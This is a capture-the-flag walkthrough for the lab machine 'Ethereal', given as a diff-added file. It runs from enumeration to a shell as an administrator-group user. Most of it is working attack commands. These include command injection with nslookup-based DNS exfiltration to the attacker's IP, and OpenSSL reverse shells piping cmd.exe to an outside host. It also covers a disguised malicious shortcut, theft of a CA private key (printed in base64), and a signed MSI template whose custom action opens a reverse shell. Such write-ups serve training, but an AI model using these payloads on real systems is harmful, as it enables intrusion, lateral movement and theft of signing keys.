@@ -1,0 +1,520 @@
+Ethereal
+
+30t h February 2019 / Document No D19.100.10
+
+Prepared By: egre55
+Machine Author: MinatoTW & egre55
+Difficulty: Insane
+Classification: Official
+
+                                                                       Page 1 / 30
+SYNOPSIS
+
+Ethereal is an "i nsane" difficulty machine, which showcases how DNS can be used to exfiltrate
+information from a system, and is applicable to many externally facing applications. It also
+features a very restrictive environment, which is made more hospitable by the use of the
+OpenSSL "LOLBIN". It highlights how malicious shortcut files can be used to move laterally and
+vertically within a system or network. Finally, it shows how an attacker would be able use trusted
+certificates to defeat a stringent application whitelisting configuration. Finally, it showcases
+techniques for creating and signing Windows Installer (MSI) files.
+
+Skills Required                         Skills Learned
+
+ Basic knowledge of Internet protocols   DNS data exfiltration
+ Intermediate knowledge of Windows       OpenSSL egress check, reverse shell,
+
+                                            digest generation, and file transfer
+                                            techniques
+                                         Malicious shortcut testing and creation
+                                         Malicious MSI testing and creation
+                                         Enumeration and replication of
+                                            AppLocker Policy
+
+                                                        Page 2 / 30
+Enumeration
+Nmap
+
+ masscan -p1-65535,U:1-65535 10.10.10.106 --rate=1000 -p1-65535,U:1-65535 -e tun0 > ports
+ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n'
+ ',' | sed 's/,$//')
+ nmap -Pn -sV -sC -p$ports 10.10.10.106
+
+Nmap output shows that (anonymous) FTP and an IIS Server listening on ports 80 and 8080 are
+available. Port 80 reveals the landing page below, and various other pages, which seem
+unexploitable. Port 8080 requests (basic) authentication.
+
+                                                                                                                 Page 3 / 30
+Inspection of FTP files
+
+Multiple files and folders are present, and so wget is used to mirror the content locally.
+
+ wget -m ftp://anonymous:anonymous@10.10.10.106/* --no-passive-ftp
+
+                                                                                                                 Page 4 / 30
+The files are examined and "FDISK.zip" is extracted. This seems to contain a Floppy Disk image.
+
+The image is mounted and inspected, which reveals the "PasswordBox" command-line password
+manager.
+ losetup -P /dev/loop0 FDISK
+
+                                                                                                                 Page 5 / 30
+PasswordBox
+
+This is copied to the current working directory, and a Linux version of PasswordBox is
+downloaded and prerequisites installed.
+ wget
+ 'https://downloads.sourceforge.net/project/passwbox/pbox%20v0.11/pbox011-linux.zip'
+ unzip pbox011-linux.zip
+ apt-get install libncurses5:i386
+ cd pbox/
+ cp -r pbox.dat /root/.pbox.dat
+ ./pbox
+
+Access is gained with a password of "password".
+
+                                                                                                                 Page 6 / 30
+Port 8080
+
+The user "alan" is referenced. The hostname "ethereal.htb" is added to "/etc/hosts". After trying to
+log in to the page on port 8080, access is gained with the username "alan" and the "management
+server" password.
+alan:!C414m17y57r1k3s4g41n!
+This reveals a "Test-Connection" page, which displays whether the ping was successful or not,
+but doesn't show command output. "tshark" is stood up and confirms that the ping request was
+successful.
+
+ tshark -i tun0 icmp
+
+                                                                                                                 Page 7 / 30
+DNS data exfiltration
+
+After trying various techniques, it seems some sort of restriction is preventing outbound
+communication. However, DNS is usually allowed out. Indeed, the DNS request is successful.
+ tshark -i tun0 host 10.10.10.106 and udp port 53
+ 127.0.0.1 & nslookup a.a.a 10.10.14.2
+It should now be possible to read environment variables from the target system. The parameter
+"-querytype=A" is specified, to make the output more readable.
+ 127.0.0.1 & nslookup -querytype=A %OS%.a.a 10.10.14.2
+This is successful, and the expected OS is returned. A treasure trove of information can be
+gleaned from Windows environment variables, see Appendix A for reference.
+
+For example, the PATH variable may reveal whether any interesting programs have been
+installed. The data contained within this variable is too large to fit inside a single DNS query, and
+so DOS substring syntax can be used to "walk" the PATH.
+ 127.0.0.1 & nslookup -querytype=A "%PATH:~0,20%".a.a 10.10.14.2
+ 127.0.0.1 & nslookup -querytype=A "%PATH:~20,20%".a.a 10.10.14.2
+
+                                                                                                                 Page 8 / 30
+Command Execution
+
+Using FOR loop one-liners, it should also be possible to achieve rudimentary command
+execution.
+ 127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('whoami') do cmd /c nslookup
+ -querytype=A %e.a.a 10.10.14.2"
+ 127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('DIR /B C:\') do cmd /c nslookup
+ -querytype=A %e.a.a 10.10.14.2"
+This is successful, and after examining the Program Files folders, OpenSSL is discovered.
+
+ 127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('DIR /B C:\Progra~2') do cmd /c
+ nslookup -querytype=A %e.a.a 10.10.14.2"
+ 127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('DIR /B
+ C:\Progra~2\OpenSSL-v1.1.0') do cmd /c nslookup -querytype=A %e.a.a 10.10.14.2"
+ 127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('DIR /B
+ C:\Progra~2\OpenSSL-v1.1.0\bin') do cmd /c nslookup -querytype=A %e.a.a 10.10.14.2"
+
+                                                                                                                 Page 9 / 30
+Foothold
+Egress check
+
+The blog post below by Andreas Hontzia (@honze) shows how OpenSSL can be used to gain a
+reverse shell from Linux.
+https://medium.com/@honze_net/openssl-reverse-shell-with-certificate-pinning-e0955c37b4a7
+Perhaps the classic t elnet 10.10.10.10 80 | cmd.exe | telnet 10.10.10.10 443
+redirection technique can be applied to OpenSSL on Windows? This seems likely, but before a
+reverse shell is attempted, it is necessary to check which ports allow outbound traffic.
+OpenSSL can be used as a port scanner. tshark is configured to listen on the first 1000 ports, and
+a simple FOR loop is executed.
+ tshark -i tun0 host 10.10.10.106 and portrange 1-1000
+ 127.0.0.1 & cmd /c "FOR /l %i in (1,1,1000) DO
+ C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:%i"
+It seems that ports 73 and 136 can be used.
+
+                                                                                                                Page 10 / 30
+OpenSSL Reverse Shell
+
+tmux is configured in preparation for a split OpenSSL terminal.
+First, the tmux window is split vertically into two panes "CTRL + B, then %"
+To switch between panes, press "CTRL + B", and the relevant arrow key
+To resize the resize pane, press and hold "CTRL + B", then press and hold the arrow key
+The OpenSSL listeners are stood up, after creating a self-signed SSL certificate (pressing enter
+through the prompts).
+ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+ openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+ openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+The command below is used to initiate a reverse shell.
+ 127.0.0.1 & START "" cmd /c "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client
+ -quiet -connect 10.10.14.2:73 | cmd.exe |
+ C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:136"
+A shell is received as "ETHEREAL\alan".
+
+                                                                                                                 Page 11 / 30
+Lateral Movement
+Malicious shortcut (.LNK)
+
+The note on Alan's Desktop is inspected. It seems that he has created a Visual Studio shortcut on
+the Public Desktop, which people have been instructed to use.
+
+If this shortcut can be overwritten with a malicious version, potentially command execution as
+another user can be achieved. Multiple methods exist of creating malicious shortcuts, but in this
+case a Windows system will be used.
+
+                                                                                                                Page 12 / 30
+Replication of target environment
+
+From a Windows Server OS (Server 2019 trial ISO link below), Visual Studio and OpenSSL are
+installed.
+https://www.microsoft.com/evalcenter/evaluate-windows-server-2019?filetype=ISO
+https://download.visualstudio.microsoft.com/download/pr/cd9a58d6-b7f7-40a5-b2ee-b5f6b1f49f
+bb/d70da2680dd650f2769a397a257caf01/vs_community.exe
+https://slproweb.com/download/Win64OpenSSL-1_1_0j.exe
+OpenSSL is installed to "C:\Progra~2\OpenSSL-v1.1.0" (mirroring Ethereal).
+
+The option is chosen to copy the OpenSSL binaries to the "/bin" directory.
+
+                                                                                                                Page 13 / 30
+Creating the shortcut
+
+Next, a shortcut is created with the command below specified as the target. The "/MIN" switch
+has been specified so that the "user" is not immediately alerted to the malicious nature of the
+shortcut.
+ C:\Windows\System32\cmd.exe /c START "" /MIN cmd /c
+ "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect
+ 172.16.249.150:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client
+ -quiet -connect 172.16.249.150:136"
+A Visual Studio icon can be chosen to replace the "cmd.exe" icon.
+
+After double-clicking the shortcut, a test shell is received.
+
+                                                                                                                Page 14 / 30
+Shell as Jorge
+
+The shortcut is updated to point to the tun0 IP address, and is copied to Ethereal using OpenSSL.
+ openssl s_server -quiet -accept 73 -cert cert.pem -key key.pem < 'Visual Studio
+ 2017.lnk'
+The following command transfers the file and creates "Visual Studio 2017_1.lnk". Sometimes the
+copy process can lock the file, which prevents execution. So it is best to copy this file to the
+destination name from another shell.
+ 127.0.0.1 & C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -connect
+ 10.10.14.2:73 -quiet > "C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017_1.lnk"
+The OpenSSL listeners are readied to receive the shell, and the command below is executed to
+rename the shortcut.
+ 127.0.0.1 & cmd /c copy "C:\Users\Public\Desktop\Shortcuts\Visual Studio
+ 2017_1.lnk" "C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk" /Y
+A shell is received as the unprivileged user "ETHEREAL\jorge", and enumeration continues.
+
+                                                                                                                Page 15 / 30
+Privilege Escalation
+Malicious MSI
+
+The "net use" command doesn't return any output. Possibly it has been blocked, but stderr is not
+being returned. By appending "2>&1" to the end of the command, it is confirmed that "net.exe"
+has been blocked.
+
+The command "fsutil fsinfo drives" can be used instead. There is a D:, which is enumerated
+further.
+
+It seems a sysadmin "Rupal" will be testing MSIs in this folder, and apparently the certificate has
+been added to the store already.
+
+                                                                                                                Page 16 / 30
+Examination of the "Certs" folder reveals a Certification Authority (CA) certificate, and MyCA.pvk
+which contains the private key.
+
+It seems that the sysadmins sign MSI files as a security measure. AppLocker MSI policy is
+examined, to confirm if signing of Windows Installer files is enforced.
+ REG EXPORT HKLM\Software\Policies\Microsoft\Windows\SrpV2\MSI AppLocker-MSI.reg
+ type AppLocker-MSI.reg
+
+This shows that the system will indeed only execute digitally signed Windows Installer files. The
+                                                                                                                Page 17 / 30
+certificate and key are base64 encoded using OpenSSL.
+
+ C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer
+ C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk
+
+MyCA.cer:
+
+ MIIDADCCAeigAwIBAgIQIPZoDPLffoVFfuI8gqFGajANBgkqhkiG9w0BAQsFADAQ
+ MQ4wDAYDVQQDEwVNeSBDQTAeFw0xODA3MDEyMTI2MzlaFw0zOTEyMzEyMzU5NTla
+ MBAxDjAMBgNVBAMTBU15IENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
+ AQEAnc1wfJAWkLGTZkTOLPigFzO5Wp+4Q6DtGHO3SxHubY3ru3caRm8y4Y5LHtlY
+ jc9ZP5BStiYsVtnqzJY1H+SxweLPQvpHYjSC54ZpMEt1AHKhuE9o9+2qdfNonRtK
+ /xLa2qcov0prPPs9LTkde5xIWw7fplAmrpvkVf4yfgSrmactNLoZby/lnG+nhsT5
+ j4ICZIGogo+Icn/eTy7UPCdRdfkOdzAHBX6xQfH6g/p7HGtPigH9rs4ia1cND6J+
+ NuPAuuLlMxpbSYE5Q1Gq8sRKdYnTMK9RfLnxa+N78qqR8R/MYr/RR4lKr2klwQm4
+ jWno4wAlqirjW5W7LDmBOsstNQIDAQABo1YwVDAPBgNVHRMBAf8EBTADAQH/MEEG
+ A1UdAQQ6MDiAEKuZwosHXc04qkkMrVgOXvShEjAQMQ4wDAYDVQQDEwVNeSBDQYIQ
+ IPZoDPLffoVFfuI8gqFGajANBgkqhkiG9w0BAQsFAAOCAQEAaJWYGIP0vCruQ7WP
+ 43P0vFuwCmSLUYM+Edz+kQGBifhBnNsU+klJ18TWwazRGE4c72oAF+gNCAvfFKIq
+ 2pbGUWaKnPzEO0znCg4pgdEIGHjNTePYngL0h76ItFlGOr4YttOIROflpk1dR6Cp
+ /1PwEOxZZ/9Kr9h1GVDiz2vcQW2VA8ALcgY584SKUkuKhE8Mqao78hU87e4dgXQL
+ KkqlkMYo7XeFa5MYZpiXCQNQNQIp1l7wAiA6mdaURtG6+PSoLZel8101iXYQbZUn
+ FAAiPQJ0lYyqerYP1tXtoSGUUEquiZFif3iU3VGA57L2repPbNIqOSOEmd47ZXT5
+ K9WXgA==
+
+MyCA.pvk:
+
+ HvG1sAAAAAACAAAAAAAAAAAAAACUBAAABwIAAAAkAABSU0EyAAgAAAEAAQA1Lcs6
+ gTksu5Vb4yqqJQDj6GmNuAnBJWmvSolH0b9izB/xkarye+Nr8bl8Ua8w04l1SsTy
+ qlFDOYFJWxoz5eK6wOM2fqIPDVdrIs6u/QGKT2sce/qD+vFBsX4FBzB3Dvl1USc8
+ 1C5P3n9yiI+CqIFkAoKP+cSGp2+c5S9vGbo0LaeZqwR+Mv5V5JuuJlCm3w5bSJx7
+ HTktPfs8a0q/KKfa2hL/ShudaPN1qu33aE+4oXIAdUswaYbngjRiR/pCz+LBseQf
+ NZbM6tlWLCa2UpA/Wc+NWNkeS47hMm9GGne7641t7hFLt3MY7aBDuJ9auTMXoPgs
+ zkRmk7GQFpB8cM2dcZKSZIFgfu9cfUwrnXbTQC2BzNdRgmJGHW+KXCFns7ve/Cfh
+ UUSEOwv+aZwivMWic+lUA3MbVE73k5SrWWAa8HfhyRGeVkClWynddhknlufRz3VT
+ owT8YoHrpOey+EJ48NX5kbb/lIL0qTzd4DtWbLDSI1oW+Cj3hiuQ1unQU7wF4Ukf
+ 7jv7zghW6Bp6LoUBFd9Dxw0Irs/aVRPyLWKv1Smk7rdiZ+Ym6/upHuLBaak4L/rM
+ qvzeT+hoV9JkdOckXA54tEf0SYoamH2+mFwSgmenHjdHEPjKOC1FJOGacC/bKB4z
+
+                                                                   Page 18 / 30
+ iw0AoLPAwoK+ld57HMo1mexAEfvwua3rT6WB1pHtuKszTcsw2llLlAk3C2OU8sJS
+ +XPjsy4564WZZJurWx10vlhPUpdKTGbF/QV+5b02FQiyR5HkWBtqKHRVyEdZB0l5
+ VFFUXWZBzYc//AqSfPZg19VcrGS2B8rU6oK/5dA4djw9oeYzpQDD5q6z/GlGrLCt
+ iwGht0fcUveev2+20QfAHkGMmK1l9ymFdABCxLxQ3RbsaRwFffzwIO7hICSjIPwP
+ 8Lfl9SbLP1TqUhfmcWhDPNgBjvgI2HuiXOTOjqgo+ML8AP4t5ctAOV3idNqGA+8o
+ QfqbZIwXW8t3DhRMOQ+y+7kZAG+0Tl4W+64Z+WbpV5NQ4Lh5zSDmy0H3NookmLbM
+ k/+6gRKfzGSnvlxR8+yngqaJoCYziE/+F3k293lHyGz7swQ+/Pgn4VnKXJPJTHwM
+ Gh7npszdDimChYLZhdo8VKSPdIe1aBcwzlxWhKe8zU39ktBCVB6COH+X2rRlNXiv
+ vvvesEbLeD0y2vFxjWxCT1IcNMSe+NWLrRLVV1FlLtjTp+uIk8158Et7Mi5/i2h3
+ ic+SiTxnQceaA9VJHLXEp3yO7hKMEpH9amU41EtFVStmiRoO3S3Bv3gGmZNKxZGJ
+ aocRCf2Rc0AjRB2xbshYFx4hCpDPdXCZRzDIjJjxQEfl1rLxQqA5rz3/3K8SyJSL
+ S79t8hzxlqwZvuMkL8LJzJi4m9Bt9sc2IxMdka4oAHAvKNpoOi6fZKINibMP69xK
+ g7lubG3/Aft9LYH2DpSSt00WyPIqFIscvOqkzrBlJHW4Dj65gsdsBqKIvb0hdfpf
+ myOjgtyxIuox7xHZOTg0TjoOnw1oMAdlBLaDfRz91TDwdd5N6T83QXLy3gY=
+
+OpenSSL is used on attacker controlled server to convert the base64 back the files.
+
+ C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -d -in MyCA.cer.b64 -out MyCA.cer
+ C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -d -in MyCA.pvk.b64 -out MyCA.pvk
+
+Next, the WiX Toolset (used to create Windows installer packages) is downloaded and extracted.
+https://github.com/wixtoolset/wix3/releases/download/wix3111rtm/wix311-binaries.zip
+
+                                                                                                                Page 19 / 30
+Replication of target environment
+
+With knowledge of the destination environment, it would be good to replicate it and confirm that
+code execution is possible, which removes the need for trial and error and multiple file transfers.
+In order to do this, a Microsoft Management Console (MMC) is be opened with administrative
+privileges.
+"Certificates", "Security Configuration and Analysis", "Security Templates", "Services" and "Group
+Policy Object Editor" snap-ins are added.
+First, the root CA certificate is added to the store by issuing the commands below, accepting the
+prompt.
+ certutil -addstore Root MyCA.cer
+ certutil -user -addstore Root MyCA.cer
+
+In the certificates MMC, verify that MyCA.cer is listed in the "Trusted Root Certification
+Authorities" store.
+
+                                                                                                               Page 20 / 30
+Next, the Application Identity service (which enables AppLocker enforcement) is started and set
+to automatic. To do this, expand "Security Templates", right-click and select "New Template". Drill
+down through to "System Services", double-click "Application Identity", select Define, set to
+Automatic and click "OK". Right-click "Default" and click "Save".
+
+Expand "Security Configuration and Analysis", right-click and select Open database.
+
+Type Default and click "Open"
+Select Default.inf and click "Open"
+Right-click, select "Analyse Computer Now" and click "OK"
+
+         (The service should say "Investigate")
+Right-click, select "Configure Computer Now" and click "OK"
+Right-click, select "Analyse Computer Now" again and click "OK"
+
+         (This time it should say "OK")
+
+Expand "Local Computer Policy", and drill down through "Computer Configuration", "Security
+Settings", "Application Control Policies" and expand "AppLocker".
+
+Select "Windows Installer Rules", right-click and select "Create Default Rules". Delete all rules
+except the "(Default Rule) All digitally signed Windows Installer files" Publisher rule.
+
+                                                                                                                Page 21 / 30
+Right-click "AppLocker", and on the "Enforcement" tab, tick the "Windows Installer rules" box, and
+click OK.
+
+Restart the test server, and AppLocker policy mirroring that on Ethereal will now be in effect.
+The WiX MSI template (see A ppendix B) is copied to the binaries directory. The OpenSSL
+command can be modified to spawn "calc.exe" or to point to a local system for testing purposes.
+
+                                                                                                               Page 22 / 30
+Creating the MSI
+
+The following commands are used to create the unsigned MSI. A test executable (notepad.exe) is
+copied to the system in order for the MSI to "install" it.
+ copy C:\Windows\notepad.exe example.exe
+ candle.exe exec.wsx
+ light.exe exec.wixobj
+The unsigned MSI is executed, and as expected, this is prevented by AppLocker policy.
+
+                                                                                                               Page 23 / 30
+Signing the MSI
+
+The following commands are used to sign the MSI using the certificate and key from Ethereal.
+First, a code signing certificate is created (Visual Studio paths may differ). When prompted for the
+private key password, select "None".
+ "C:\Program Files (x86)\Windows Kits\10\bin\10.0.17763.0\x64\makecert.exe" -pe -n
+ "CN=My SPC" -a sha256 -cy end -sky signature -ic MyCA.cer -iv MyCA.pvk -sv
+ MySPC.pvk MySPC.cer
+
+Next, the code signing certificate and private key are converted to PFX (Personal Information
+Exchange).
+ "C:\Program Files (x86)\Windows Kits\10\bin\10.0.17763.0\x64\pvk2pfx.exe" -pvk
+ MySPC.pvk -spc MySPC.cer -pfx MySPC.pfx
+The MSI is renamed to "exec-signed.msi" and the PFX is used to sign it.
+ "C:\Program Files (x86)\Windows Kits\10\bin\10.0.17763.0\x64\signtool.exe" sign /v
+ /f MySPC.pfx exec-signed.msi
+
+                                                                                                               Page 24 / 30
+After running the signed MSI the test payload executes successfully. The MSI can now be
+recreated with the OpenSSL reverse shell payload.
+
+                                                                                                               Page 25 / 30
+Shell as Rupal
+
+OpenSSL is stood up, and the MSI is transferred to Ethereal.
+ openssl s_server -quiet -accept 73 -cert cert.pem -key key.pem < 'exec-signed.msi'
+
+ 127.0.0.1 & START "" cmd /c "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client
+ -connect 10.10.14.2:73 -quiet > C:\Users\Public\Desktop\Shortcuts\exec-signed.msi"
+
+OpenSSL is used to generate a SHA1 digest for source and destination files, to confirm that the
+file transfer completed successfully.
+ C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe sha1 exec-signed.msi
+
+The OpenSSL listeners are stood up again, and the MSI is moved to the "MSIs" folder.
+ copy exec-signed.msi D:\DEV\MSIs\exec-signed.msi
+
+After waiting 5 minutes (at most), a reverse shell running as "ETHEREAL\rupal" is received, and
+the root flag can be captured.
+
+Note:
+
+       Page 26 / 30
+Rupal is in the "Administrators" group, but is a split-token admin, and so a UAC bypass would be
+required in order to gain full administrative privileges.
+
+                                                                                                                Page 27 / 30
+Appendix A: Windows Variables
+
+ ALLUSERSPROFILE
+ APPDATA
+ CommonProgramFiles
+ CommonProgramFiles(x86)
+ COMMONPROGRAMFILES(x86)
+ CommonProgramW6432
+ COMPUTERNAME
+ ComSpec
+ COMSPEC
+ DEFLOGDIR
+ FSHARPINSTALLDIR
+ HOMEDRIVE
+ HOMEPATH
+ LOCALAPPDATA
+ LOGONSERVER
+ NUMBER_OF_PROCESSORS
+ OneDrive
+ OS
+ Path
+ PATH
+ PATHEXT
+ PROCESSOR_ARCHITECTURE
+ PROCESSOR_IDENTIFIER
+ PROCESSOR_LEVEL
+ PROCESSOR_REVISION
+ ProgramData
+ ProgramFiles
+ ProgramFiles(x86)
+ ProgramW6432
+ PROMPT
+ __PSLockdownPolicy
+ PSModulePath
+ PUBLIC
+ SESSIONNAME
+
+                               Page 28 / 30
+shell: Administrative Tools
+shell:Common Administrative Tools
+shell:DocumentsLibrary
+shell: InternetFolder
+shell: Librariesshell:UserProfiles
+shell:MyComputerFolder
+shell: Personal
+shell: SearchHomeFolder
+shell: SendTo
+shell:System shell:NetworkPlacesFolder
+shell:UserProfiles
+SystemDrive
+SYSTEMDRIVE
+SystemRoot
+SYSTEMROOT
+TEMP
+TMP
+USERDNSDOMAIN
+USERDOMAIN
+USERDOMAIN_ROAMINGPROFILE
+USERNAME
+USERPROFILE
+WINDIR
+
+                                                                                                              Page 29 / 30
+Appendix B: WiX MSI Template
+
+ <?x ml version=" 1.0"? >
+ <W ix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+
+            <Product Id=" *" UpgradeCode="12345678-1234-1234-1234-111111111111"
+ Name=" Example Product Name" Version=" 0.0.1" Manufacturer="Example Company Name"
+ Language="1033">
+
+                       <Package InstallerVersion=" 200" Compressed="yes" Comments=" Windows
+ Installer Package"/ >
+
+                       <Media Id=" 1" Cabinet=" product.cab" EmbedCab="yes"/ >
+
+                       <D irectory Id=" TARGETDIR" Name=" SourceDir">
+                                  <Directory Id="ProgramFilesFolder">
+                                             <Directory Id=" INSTALLDIR" Name="Example">
+                                                        <C omponent Id="ApplicationFiles"
+
+ Guid="12345678-1234-1234-1234-222222222222">
+                                                                   <File Id="ApplicationFile1"
+
+ Source="example.exe"/ >
+                                                        </C omponent>
+
+                                             </Directory>
+                                  </Directory>
+                       </Directory>
+
+                       <Feature Id="DefaultFeature" Level=" 1">
+                                  <ComponentRef Id=" ApplicationFiles"/ >
+
+                       </F eature>
+
+                       <C ustomAction Id="shellex" Directory="TARGETDIR" Impersonate="no"
+ ExeCommand="cmd.exe /c ping -n 15 localhost &amp;&amp;
+ C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 |
+ cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect
+ 10.10.14.2:136" Return="check" />
+
+            <InstallExecuteSequence>
+            <Custom Action="shellex" After="InstallFiles" />
+            </InstallExecuteSequence>
+            </P roduct>
+ </Wix>
+
+                                                                                                               Page 30 / 30
+
